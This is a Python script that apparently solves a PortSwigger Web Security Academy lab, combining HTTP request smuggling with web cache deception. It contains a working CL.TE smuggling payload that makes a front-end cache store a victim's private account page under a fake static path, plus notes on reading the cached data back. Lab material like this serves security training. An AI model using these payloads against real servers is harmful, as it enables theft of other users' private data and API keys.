"""
Lab 12: Exploiting HTTP request smuggling to perform web cache deception
https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception
Difficulty: Expert

📝 Opposite direction from Lab 11: here we trick the cache into storing a
PRIVATE, user-specific response (e.g. the victim's own /my-account page,
containing their API key) under a path the cache thinks is static/public
— then we just request that same path ourselves to read their data back.
"""

from utils import send_same_connection, normalize_crlf, log, note

HOST = "YOUR-LAB-ID.web-security-academy.net"
# A path that LOOKS like a static resource to the cache's matching rules
# but is actually routed to the dynamic, session-specific account page.
DECEPTIVE_PATH = "/my-account/nonexistent.js"

SMUGGLE_PAYLOAD = normalize_crlf("""POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 130
Transfer-Encoding: chunked

0

GET {deceptive_path} HTTP/1.1
Host: {host}
X-Ignore: X""".format(host=HOST, deceptive_path=DECEPTIVE_PATH))


def run():
    note("This smuggled request rides on the VICTIM's session (their request")
    note("is what actually gets appended/misrouted into ours on the shared")
    note("connection) — so the resulting cached response contains THEIR")
    note("account data, cached under DECEPTIVE_PATH because the cache's")
    note("rules treat the trailing .js as 'this must be static'.")

    results = send_same_connection(HOST, [SMUGGLE_PAYLOAD])
    log(f"Smuggle sent, response: {results[0][0][:300]!r}")

    note("After a victim's traffic hits this connection, fetch")
    note(f"{DECEPTIVE_PATH} yourself (plain GET, your own session) — if")
    note("their data comes back, the deception worked and it's now cached.")


if __name__ == "__main__":
    run()
